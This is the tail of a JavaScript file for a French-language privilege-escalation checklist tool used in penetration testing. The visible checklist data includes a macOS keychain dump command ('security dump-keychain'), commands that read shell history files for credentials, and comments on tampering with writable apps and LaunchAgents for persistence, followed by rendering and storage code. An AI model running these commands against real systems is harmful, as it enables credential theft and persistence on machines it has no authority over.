                exploitCommand: '# Similaire à Linux, dépend des binaires trouvés (voir GTFOBins)',
                tags: ['Permissions', 'Binary', 'SUID/SGID']
            },
             {
                id: 'm_writable_apps',
                label: 'Writable Applications in /Applications',
                description: 'Vérifier si des applications dans /Applications ou /System/Applications sont modifiables par l\'utilisateur.',
                checkCommand: 'find /Applications /System/Applications -perm -o+w -type d -ls 2>/dev/null',
                exploitCommand: '# Si une application est modifiable, possibilité de remplacer son binaire ou d\'ajouter des scripts malveillants (ex: via Info.plist).',
                tags: ['Permissions', 'Misconfiguration', 'Filesystem']
            }
        ],
        'Credentials & Sensitive Info': [
             {
                id: 'm_keychain_dump',
                label: 'Keychain Dump',
                description: 'Tenter d\'extraire des secrets du trousseau d\'accès (Keychain).',
                checkCommand: '# Utiliser l\'outil `security` ou des scripts/outils tiers (ex: ChainJacker)',
                exploitCommand: '# Nécessite souvent le mot de passe de session de l\'utilisateur\nsecurity dump-keychain -d login.keychain',
                tips: 'Le trousseau peut contenir des mots de passe wifi, web, certificats, clés privées, etc.',
                links: ['https://github.com/razvand/ChainJacker'],
                tags: ['Credentials', 'Dumping', 'Keychain']
            },
             {
                id: 'm_history_files',
                label: 'Shell History Files',
                description: 'Vérifier les fichiers d\'historique (bash, zsh).',
                checkCommand: 'cat ~/.bash_history\ncat ~/.zsh_history',
                tags: ['Credentials', 'Enumeration', 'History']
            }
        ],
         'System & Services': [
             {
                id: 'm_launchd',
                label: 'LaunchAgents & LaunchDaemons',
                description: 'Analyser les LaunchAgents (utilisateur) et LaunchDaemons (système) pour des configurations faibles ou des fichiers modifiables.',
                checkCommand: 'ls -l ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons /System/Library/LaunchAgents /System/Library/LaunchDaemons\n# Vérifier les permissions des fichiers .plist et des binaires/scripts pointés',
                exploitCommand: '# Si un .plist ou son script associé est modifiable, possibilité d\'exécution de code ou de persistance.',
                tags: ['Misconfiguration', 'Persistence', 'Service']
            }
        ]
    }
};
// ==========================================================================
// ==================== FIN CHECKLIST DEFINITION ============================
// ==========================================================================


document.addEventListener('DOMContentLoaded', () => {
    console.log("Privesc Cockpit v3 (Refactored) Initializing...");

    // --- Références DOM ---
    const nodeSelect = document.getElementById('node-select');
    const activeNodeInfoEl = document.getElementById('active-node-info');
    const checklistContainer = document.getElementById('checklist-container');
    const checklistPlaceholder = document.getElementById('checklist-placeholder');
    const checklistSearchInput = document.getElementById('checklist-search');
    const checklistFilterStatus = document.getElementById('checklist-filter-status');
    const checklistFilterTag = document.getElementById('checklist-filter-tag');
    const checklistItemTemplate = document.getElementById('checklist-item-template');
    const quickNavLinksContainer = document.getElementById('quick-nav-links');

    // Vérification initiale des éléments critiques
    if (!nodeSelect || !checklistContainer || !checklistItemTemplate || !quickNavLinksContainer || !checklistPlaceholder || !activeNodeInfoEl) {
        console.error("ERREUR CRITIQUE: Un ou plusieurs éléments DOM essentiels sont manquants. Vérifiez les IDs dans privesc.html.");
        const body = document.querySelector('body');
        if (body) {
            body.innerHTML = '<div class="alert alert-danger m-5" role="alert">Erreur critique: Impossible d\'initialiser l\'interface. Veuillez vérifier la console du navigateur (F12) et contacter le développeur. Les IDs HTML pourraient être incorrects.</div>';
        }
        return;
    }

    // --- État Global ---
    let hostManagerData = null;
    let currentNodeId = null;
    let checklistState = {};
    let availableTags = new Set();
    const HOST_MANAGER_STORAGE_KEY = 'pentestHostData_v2';
    const CHECKLIST_STORAGE_KEY = 'privescChecklistState_v3_refactored';

    // --- Initialisation ---
    function initialize() {
        console.log("Initializing Privesc Cockpit v3...");
        loadHostManagerData();
        loadChecklistStateFromStorage();
        setupEventListeners();
        collectAndPopulateTags();
        displayInitialView();
    }

    // --- Chargement des Données ---
    function loadHostManagerData() {
        console.log(`Attempting to load data from HostManager (localStorage key: ${HOST_MANAGER_STORAGE_KEY})...`);
        try {
            const storedData = localStorage.getItem(HOST_MANAGER_STORAGE_KEY);
            if (storedData) {
                hostManagerData = JSON.parse(storedData);
                console.log("HostManager data loaded successfully:", hostManagerData);
                // Vérifier si les catégories existent et sont un objet
                if (hostManagerData && typeof hostManagerData.categories === 'object' && hostManagerData.categories !== null) {
                    populateNodeSelector(); // Appeler seulement si les données sont valides
                } else {
                     console.warn("HostManager data loaded, but 'categories' property is missing or not an object.");
                     if (nodeSelect) {
                         nodeSelect.innerHTML = '<option value="">Données HostManager invalides</option>';
                         nodeSelect.disabled = true;
                     }
                }
            } else {
                console.warn(`No HostManager data found in localStorage ('${HOST_MANAGER_STORAGE_KEY}').`);
                hostManagerData = { categories: {}, edges: [] };
                if (nodeSelect) {
                    nodeSelect.innerHTML = '<option value="">Aucune donnée HostManager trouvée</option>';
                    nodeSelect.disabled = true;
                }
            }
        } catch (error) {
            console.error("Error loading or parsing HostManager data:", error);
            hostManagerData = { categories: {}, edges: [] };
            if (nodeSelect) {
                nodeSelect.innerHTML = '<option value="">Erreur chargement données</option>';
                nodeSelect.disabled = true;
            }
            if (checklistPlaceholder) {
                checklistPlaceholder.textContent = "Erreur lors du chargement des données depuis HostManager.";
                checklistPlaceholder.style.display = 'block';
            }
        }
    }

    function loadChecklistStateFromStorage() {
        console.log("Loading checklist state from localStorage...");
        try {
            const storedState = localStorage.getItem(CHECKLIST_STORAGE_KEY);
            if (storedState) {
                checklistState = JSON.parse(storedState);
                console.log("Previous checklist state loaded:", checklistState);
            } else {
                console.log("No previous checklist state found.");
                checklistState = {};
            }
        } catch (error) {
            console.error("Error loading checklist state:", error);
            checklistState = {};
        }
    }

    // --- Sauvegarde de l'État ---
    function saveChecklistStateToStorage() {
        try {
            localStorage.setItem(CHECKLIST_STORAGE_KEY, JSON.stringify(checklistState));
        } catch (error) {
            console.error("Error saving checklist state:", error);
        }
    }

    function updateChecklistItemState(itemId, status, notes) {
        if (!currentNodeId) return;

        if (!checklistState[currentNodeId]) {
            checklistState[currentNodeId] = {};
        }
        checklistState[currentNodeId][itemId] = { status, notes };
        saveChecklistStateToStorage();
        // console.log(`State updated for ${currentNodeId} - ${itemId}:`, checklistState[currentNodeId][itemId]);
    }

    // --- Mise à jour de l'UI ---

    // populateNodeSelector (CORRIGÉE pour itérer sur l'objet hosts)
    function populateNodeSelector() {
        if (!nodeSelect) return;
        if (!hostManagerData || typeof hostManagerData.categories !== 'object' || hostManagerData.categories === null) {
            console.warn("populateNodeSelector: hostManagerData ou hostManagerData.categories invalide.");
            nodeSelect.innerHTML = '<option value="">Données invalides</option>';
            nodeSelect.disabled = true;
            return;
        }

        nodeSelect.innerHTML = ''; // Vider les anciennes options
        nodeSelect.disabled = false; // Activer le select

        const defaultOption = document.createElement('option');
        defaultOption.value = '';
        defaultOption.textContent = '-- Sélectionnez un Node --';
        nodeSelect.appendChild(defaultOption);

        let hostCount = 0;
        // Itérer sur les clés de l'objet categories
        Object.keys(hostManagerData.categories).forEach(categoryName => {
            const category = hostManagerData.categories[categoryName];
            // Vérifier si la catégorie a une propriété 'hosts' et si c'est un OBJET
            if (category && typeof category.hosts === 'object' && category.hosts !== null) {
                // Itérer sur les CLÉS de l'objet hosts (qui sont les IDs/noms des hôtes)
                Object.keys(category.hosts).forEach(hostId => {
                    const host = category.hosts[hostId];
                    // Utiliser hostId comme valeur et host.ipName (ou hostId si ipName manque) comme texte
                    if (host) { // Vérifier juste que l'objet host existe
                        const option = document.createElement('option');
                        option.value = hostId; // Utiliser la clé de l'objet host comme ID
                        // Utiliser host.ipName si disponible, sinon hostId comme fallback
                        option.textContent = `${host.ipName || hostId} (${categoryName})`;
                        nodeSelect.appendChild(option);
                        hostCount++;
                    } else {
                        console.warn("Hôte invalide trouvé (clé sans valeur?) dans la catégorie:", categoryName, hostId);
                    }
                });
            } else {
                 // Ce log est normal si une catégorie n'a pas d'objet 'hosts' ou si 'hosts' n'est pas un objet
                 // console.warn("Catégorie sans objet 'hosts' valide:", categoryName, category);
            }
        });

        if (hostCount === 0) {
            nodeSelect.innerHTML = '<option value="">Aucun node trouvé dans HostManager</option>';
            nodeSelect.disabled = true;
            console.warn("Aucun hôte valide trouvé dans les données HostManager pour peupler le sélecteur.");
        } else {
             console.log(`${hostCount} node(s) added to the selector.`);
        }
    }

    // findHostInHostManagerData (CORRIGÉE pour itérer sur l'objet hosts)
    function findHostInHostManagerData(nodeId) {
        if (!hostManagerData || typeof hostManagerData.categories !== 'object') {
            return null;
        }

        // Itérer sur les catégories
        for (const categoryName in hostManagerData.categories) {
            const category = hostManagerData.categories[categoryName];
            // Vérifier si la catégorie a un objet 'hosts'
            if (category && typeof category.hosts === 'object' && category.hosts !== null) {
                 // Vérifier si l'objet hosts contient directement la clé nodeId
                 if (category.hosts.hasOwnProperty(nodeId)) {
                     // Retourner l'objet host correspondant à la clé nodeId
                     // Cloner l'objet pour éviter les modifications accidentelles et ajouter l'ID
                     const hostData = { ...category.hosts[nodeId], id: nodeId };
                     return hostData;
                 }
            }
        }
        console.warn(`Host with ID "${nodeId}" not found in hostManagerData.`);
        return null; // Retourner null si non trouvé après avoir parcouru toutes les catégories
    }

    // detectOS (Utilise findHostInHostManagerData corrigée)
    function detectOS(nodeId) {
        const hostInfo = findHostInHostManagerData(nodeId);
        if (!hostInfo) return 'Unknown';

        const system = (hostInfo.system || '').toLowerCase();
        // Assurer que tags est un tableau, même s'il est absent ou null dans les données
        const tags = Array.isArray(hostInfo.tags) ? hostInfo.tags : [];

        if (system.includes('windows')) return 'Windows';
        if (system.includes('linux')) return 'Linux';
        if (system.includes('macos') || system.includes('darwin')) return 'MacOS';

        // Détection basée sur les tags (si 'system' est ambigu)
        if (tags.includes('AD') || tags.includes('Domain Controller') || tags.includes('Windows Server')) return 'Windows';
        if (tags.includes('Linux') || tags.includes('Ubuntu') || tags.includes('Debian') || tags.includes('CentOS')) return 'Linux';

        console.warn(`OS non détecté pour ${nodeId}, système: ${hostInfo.system}, tags: ${tags.join(',')}. Défaut: Linux`);
        return 'Linux'; // Retourner Linux par défaut si inconnu
    }

    // displayNodeInfo (Utilise findHostInHostManagerData corrigée)
    function displayNodeInfo(nodeId) {
        if (!activeNodeInfoEl) return;

        const hostInfo = findHostInHostManagerData(nodeId);
        if (hostInfo) {
            const os = detectOS(nodeId); // Utiliser la détection d'OS
            // Assurer que tags est un tableau avant de mapper
            const tagsArray = Array.isArray(hostInfo.tags) ? hostInfo.tags : [];
            const tagsHtml = tagsArray.length > 0
                ? tagsArray.map(tag => `<span class="badge bg-secondary me-1">${tag}</span>`).join(' ')
                : 'Aucun tag';

            activeNodeInfoEl.innerHTML = `
                <span class="me-2"><strong>IP/Nom:</strong> ${hostInfo.ipName || nodeId}</span>
                <span class="me-2"><strong>OS Détecté:</strong> ${os}</span>
                <span class="me-2"><strong>Système (brut):</strong> ${hostInfo.system || 'N/A'}</span>
                <span><strong>Tags:</strong> ${tagsHtml}</span>
            `;
            // Activer les filtres
            if (checklistSearchInput) checklistSearchInput.disabled = false;
            if (checklistFilterStatus) checklistFilterStatus.disabled = false;
            if (checklistFilterTag) checklistFilterTag.disabled = false;
        } else {
            activeNodeInfoEl.textContent = 'Infos du node non trouvées.';
            // Désactiver les filtres
             if (checklistSearchInput) checklistSearchInput.disabled = true;
             if (checklistFilterStatus) checklistFilterStatus.disabled = true;
             if (checklistFilterTag) checklistFilterTag.disabled = true;
        }
    }

    function displayInitialView() {
        if (checklistContainer) checklistContainer.innerHTML = ''; // Vider la checklist
        if (checklistPlaceholder) {
            checklistPlaceholder.textContent = 'Sélectionnez un node pour afficher la checklist contextuelle.';
            checklistPlaceholder.style.display = 'block'; // Afficher le placeholder
        }
        if (activeNodeInfoEl) activeNodeInfoEl.textContent = 'Sélectionnez un node...'; // Réinitialiser infos node
        if (quickNavLinksContainer) {
             // Garder le span "Aller à:" s'il existe, sinon vider
             const span = quickNavLinksContainer.querySelector('span');
             quickNavLinksContainer.innerHTML = '';
             if (span) quickNavLinksContainer.appendChild(span);
             quickNavLinksContainer.style.display = 'none'; // Cacher la barre de nav rapide
        }
         // Désactiver les filtres
         if (checklistSearchInput) checklistSearchInput.disabled = true;
         if (checklistFilterStatus) checklistFilterStatus.disabled = true;
         if (checklistFilterTag) checklistFilterTag.disabled = true;
    }

    function collectAndPopulateTags() {
        availableTags.clear();
        // Parcourir toutes les définitions pour collecter les tags
        Object.values(CHECKLIST_DEFINITION).forEach(osDefinition => {
            Object.values(osDefinition).forEach(categoryItems => {
                categoryItems.forEach(item => {
                    if (item.tags && Array.isArray(item.tags)) {
                        item.tags.forEach(tag => availableTags.add(tag));
                    }
                });
            });
        });

        // Peupler le select de filtre
        if (checklistFilterTag) {
            checklistFilterTag.innerHTML = '<option value="">Tous Tags</option>'; // Option par défaut
            const sortedTags = Array.from(availableTags).sort();
            sortedTags.forEach(tag => {
                const option = document.createElement('option');
                option.value = tag;
                option.textContent = tag;
                checklistFilterTag.appendChild(option);
            });
        }
    }

    function renderChecklistForNode(nodeId) {
        console.log(`Rendering checklist for node: ${nodeId}`);
        currentNodeId = nodeId;
        displayNodeInfo(nodeId); // Afficher les infos du node

        const os = detectOS(nodeId);
        const definition = CHECKLIST_DEFINITION[os];

        // Vider le conteneur et les liens rapides
        if (checklistContainer) checklistContainer.innerHTML = '';
        if (quickNavLinksContainer) {
             const span = quickNavLinksContainer.querySelector('span'); // Garder le span "Aller à:"
             quickNavLinksContainer.innerHTML = '';
             if (span) quickNavLinksContainer.appendChild(span);
        }

        if (!definition) {
            console.warn(`No checklist definition found for OS: ${os}`);
            if (checklistPlaceholder) {
                checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS détecté (${os || 'Inconnu'}) sur ce node.`;
                checklistPlaceholder.style.display = 'block';
            }
             if (quickNavLinksContainer) quickNavLinksContainer.style.display = 'none'; // Cacher les liens nav
            return;
        }

        if (checklistPlaceholder) checklistPlaceholder.style.display = 'none'; // Cacher le placeholder principal
        if (quickNavLinksContainer) quickNavLinksContainer.style.display = 'flex'; // Afficher les liens nav

        const fragment = document.createDocumentFragment();
        const navFragment = document.createDocumentFragment();

        // Trier les catégories par ordre alphabétique
        const sortedCategories = Object.keys(definition).sort();

        sortedCategories.forEach(categoryName => {
            const items = definition[categoryName];
            if (!items || items.length === 0) return;

            // Créer l'ID de catégorie (plus robuste)
            const categoryId = `category-${os.toLowerCase()}-${categoryName.toLowerCase().replace(/[^a-z0-9]/g, '-')}`;

            // Ajouter l'en-tête de catégorie
            const header = document.createElement('h2');
            header.className = 'checklist-category-header';
            header.textContent = categoryName;
            header.id = categoryId;
            header.dataset.categoryName = categoryName; // Pour le filtrage
            fragment.appendChild(header);

            // Ajouter le lien de navigation rapide
            const navLink = document.createElement('a');
            navLink.href = `#${categoryId}`;
            navLink.className = 'btn btn-sm btn-outline-secondary quick-nav-link me-1 mb-1'; // Style bouton + marge
            navLink.textContent = categoryName;
            navFragment.appendChild(navLink);

            // Ajouter les items de la catégorie
            items.forEach(item => {
                const itemElement = createChecklistItemElement(item, nodeId);
                fragment.appendChild(itemElement);
            });
        });

        if (checklistContainer) checklistContainer.appendChild(fragment);
        if (quickNavLinksContainer) quickNavLinksContainer.appendChild(navFragment);

        applyFilters(); // Appliquer les filtres après le rendu initial
    }

    function createChecklistItemElement(item, nodeId) {
        if (!checklistItemTemplate) {
            console.error("Template #checklist-item-template non trouvé !");
            return document.createElement('div'); // Retourner un div vide pour éviter erreur fatale
        }
        const clone = checklistItemTemplate.content.cloneNode(true);
        const itemElement = clone.querySelector('.checklist-item');
        const label = clone.querySelector('.checklist-label');
        const description = clone.querySelector('.checklist-description');
        const statusSelect = clone.querySelector('.checklist-status-select');
        const notesTextarea = clone.querySelector('.checklist-notes-textarea');
        const checkCommandContainer = clone.querySelector('.check-command');
        const checkCommandCode = checkCommandContainer?.querySelector('code');
        const checkCommandCopyBtn = checkCommandContainer?.querySelector('.copy-btn-inline');
        const exploitCommandContainer = clone.querySelector('.exploit-command');
        const exploitCommandCode = exploitCommandContainer?.querySelector('code');
        const exploitCommandCopyBtn = exploitCommandContainer?.querySelector('.copy-btn-inline');
        const linksContainer = clone.querySelector('.checklist-links');
        const tipsContainer = clone.querySelector('.checklist-tips');
        const tipsParagraph = tipsContainer?.querySelector('p');

        // Vérifier si tous les éléments nécessaires existent
        if (!itemElement || !label || !description || !statusSelect || !notesTextarea || !checkCommandContainer || !exploitCommandContainer || !linksContainer || !tipsContainer) {
             console.error("Structure du template invalide. Éléments manquants pour l'item:", item.id);
             return document.createElement('div');
        }

        // Remplir les données
        itemElement.dataset.itemId = item.id;
        itemElement.dataset.tags = item.tags ? item.tags.join(',') : '';
        label.textContent = item.label;
        description.textContent = item.description;

        // Commandes
        if (item.checkCommand && checkCommandCode && checkCommandCopyBtn) {
            checkCommandCode.textContent = item.checkCommand;
            checkCommandCopyBtn.dataset.clipboardText = item.checkCommand;
            checkCommandContainer.style.display = '';
        } else if (checkCommandContainer) {
             checkCommandContainer.style.display = 'none';
        }

        if (item.exploitCommand && exploitCommandCode && exploitCommandCopyBtn) {
            exploitCommandCode.textContent = item.exploitCommand;
            exploitCommandCopyBtn.dataset.clipboardText = item.exploitCommand;
            exploitCommandContainer.style.display = '';
        } else if (exploitCommandContainer) {
            exploitCommandContainer.style.display = 'none';
        }

        // Liens
        if (item.links && item.links.length > 0 && linksContainer) {
            linksContainer.innerHTML = '<h6><i class="fas fa-link"></i> Liens Utiles</h6>'; // Reset + titre
            item.links.forEach(link => {
                const a = document.createElement('a');
                a.href = link;
                a.target = '_blank';
                a.rel = 'noopener noreferrer';
                // Essayer d'extraire un nom de domaine plus lisible
                try {
                    const url = new URL(link);
                    a.textContent = url.hostname;
                } catch (e) {
                    a.textContent = link; // Fallback si URL invalide
                }
                linksContainer.appendChild(a);
            });
            linksContainer.style.display = '';
        } else if (linksContainer) {
            linksContainer.style.display = 'none';
        }

        // Tips
        if (item.tips && tipsParagraph && tipsContainer) {
            tipsParagraph.textContent = item.tips;
            tipsContainer.style.display = '';
        } else if (tipsContainer) {
            tipsContainer.style.display = 'none';
        }

        // État sauvegardé (Statut et Notes)
        const nodeState = checklistState[nodeId] || {};
        const itemState = nodeState[item.id] || { status: 'todo', notes: '' };

        if (statusSelect) {
            statusSelect.value = itemState.status;
            // Appliquer la classe de statut initiale
            itemElement.classList.add(`status-${itemState.status}`);
        }
        if (notesTextarea) {
            notesTextarea.value = itemState.notes;
        }

        return clone; // Retourner le fragment cloné
    }

    function applyFilters() {
        if (!checklistContainer) return;

        const searchTerm = checklistSearchInput ? checklistSearchInput.value.toLowerCase() : '';
        const selectedStatus = checklistFilterStatus ? checklistFilterStatus.value : '';
        const selectedTag = checklistFilterTag ? checklistFilterTag.value : '';

        const items = checklistContainer.querySelectorAll('.checklist-item');
        const categoryHeaders = checklistContainer.querySelectorAll('.checklist-category-header');
        let visibleItems = 0;

        items.forEach(item => {
            const label = item.querySelector('.checklist-label')?.textContent.toLowerCase() || '';
            const description = item.querySelector('.checklist-description')?.textContent.toLowerCase() || '';
            const notes = item.querySelector('.checklist-notes-textarea')?.value.toLowerCase() || '';
            const statusSelect = item.querySelector('.checklist-status-select');
            const status = statusSelect ? statusSelect.value : 'todo';
            const tags = item.dataset.tags ? item.dataset.tags.split(',') : [];

            const matchesSearch = !searchTerm || label.includes(searchTerm) || description.includes(searchTerm) || notes.includes(searchTerm);
            const matchesStatus = !selectedStatus || status === selectedStatus;
            const matchesTag = !selectedTag || tags.includes(selectedTag);

            if (matchesSearch && matchesStatus && matchesTag) {
                item.style.display = '';
                visibleItems++;
            } else {
                item.style.display = 'none';
            }
        });

        // Afficher/Masquer les en-têtes de catégorie
        categoryHeaders.forEach(header => {
            let categoryHasVisibleItems = false;
            let nextElement = header.nextElementSibling;
            while (nextElement && !nextElement.classList.contains('checklist-category-header')) {
                if (nextElement.classList.contains('checklist-item') && nextElement.style.display !== 'none') {
                    categoryHasVisibleItems = true;
                    break;
                }
                nextElement = nextElement.nextElementSibling;
            }
            header.style.display = categoryHasVisibleItems ? '' : 'none';
        });

        // Afficher/Masquer le placeholder
        const hasAnyItems = checklistContainer.querySelector('.checklist-item') !== null;
        if (checklistPlaceholder) {
            if (visibleItems === 0 && hasAnyItems) {
                checklistPlaceholder.textContent = 'Aucun item ne correspond aux filtres sélectionnés.';
                checklistPlaceholder.style.display = 'block';
            } else if (hasAnyItems) {
                 checklistPlaceholder.style.display = 'none';
            }
            // Ne pas modifier le placeholder s'il n'y a aucun item (géré par renderChecklistForNode/displayInitialView)
        }
    }

    function copyToClipboard(text, buttonElement) {
        if (text === undefined || text === null) { // Vérifier explicitement undefined et null
             console.warn("Tentative de copie d'une valeur vide ou indéfinie.");
             return;
        }
        navigator.clipboard.writeText(text).then(() => {
            const originalContent = buttonElement.innerHTML;
            buttonElement.innerHTML = '<i class="fas fa-check text-success"></i>';
            buttonElement.disabled = true;
            setTimeout(() => {
                buttonElement.innerHTML = originalContent;
                buttonElement.disabled = false;
            }, 1500);
        }).catch(err => {
            console.error('Erreur lors de la copie :', err);
            const originalContent = buttonElement.innerHTML;
            buttonElement.innerHTML = '<i class="fas fa-times text-danger"></i>';
             setTimeout(() => {
                buttonElement.innerHTML = originalContent;
            }, 1500);
        });
    }

    function setupEventListeners() {
        console.log("Setting up event listeners...");

        if (nodeSelect) {
            nodeSelect.addEventListener('change', (e) => {
                console.log("Node selection changed:", e.target.value);
                const selectedNodeId = e.target.value;
                if (selectedNodeId) {
                    renderChecklistForNode(selectedNodeId);
                } else {
                    currentNodeId = null;
                    displayInitialView();
                }
            });
        } else { console.warn("Node select not found."); }

        if (checklistSearchInput) checklistSearchInput.addEventListener('input', applyFilters);
        if (checklistFilterStatus) checklistFilterStatus.addEventListener('change', applyFilters);
        if (checklistFilterTag) checklistFilterTag.addEventListener('change', applyFilters);

        // La délégation sur checklistContainer gère les éléments internes
        if (checklistContainer) {
            console.log("Attaching delegated listeners to checklistContainer...");
            checklistContainer.addEventListener('click', (event) => {
                const copyButton = event.target.closest('.copy-btn-inline');
                if (copyButton) {
                    console.log("Copy button clicked.");
                    const textToCopy = copyButton.dataset.clipboardText;
                    // Vérifier explicitement undefined et null
                    if (textToCopy !== undefined && textToCopy !== null) {
                        copyToClipboard(textToCopy, copyButton);
                    } else {
                        console.warn("data-clipboard-text est vide ou non défini pour le bouton:", copyButton);
                    }
                }
            });

            checklistContainer.addEventListener('change', (event) => {
                if (event.target.matches('.checklist-status-select')) {
                    console.log("Status select changed.");
                    const selectElement = event.target;
                    const itemElement = selectElement.closest('.checklist-item');
                    if (!itemElement) return;
                    const itemId = itemElement.dataset.itemId;
                    const newStatus = selectElement.value;
                    const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');
                    const currentNotes = notesTextarea ? notesTextarea.value : '';

                    // Mise à jour visuelle immédiate
                    itemElement.className = itemElement.className.replace(/status-\w+/g, '');
                    itemElement.classList.add(`status-${newStatus}`);

                    updateChecklistItemState(itemId, newStatus, currentNotes);
                }
            });

            checklistContainer.addEventListener('input', (event) => {
                 if (event.target.matches('.checklist-notes-textarea')) {
                     // console.log("Notes textarea input detected."); // Commenté pour moins de bruit
                     const notesTextarea = event.target;
                     const itemElement = notesTextarea.closest('.checklist-item');
                     if (!itemElement) return;
                     const itemId = itemElement.dataset.itemId;
                     const newNotes = notesTextarea.value;
                     const statusSelect = itemElement.querySelector('.checklist-status-select');
                     const currentStatus = statusSelect ? statusSelect.value : 'todo';

                     updateChecklistItemState(itemId, currentStatus, newNotes);
                 }
            });
            console.log("Delegated listeners attached successfully.");
        } else {
            console.error("setupEventListeners: checklistContainer non trouvé, la délégation d'événements ne fonctionnera pas.");
        }
    }

    // --- Initialiser l'application ---
    initialize();
}); 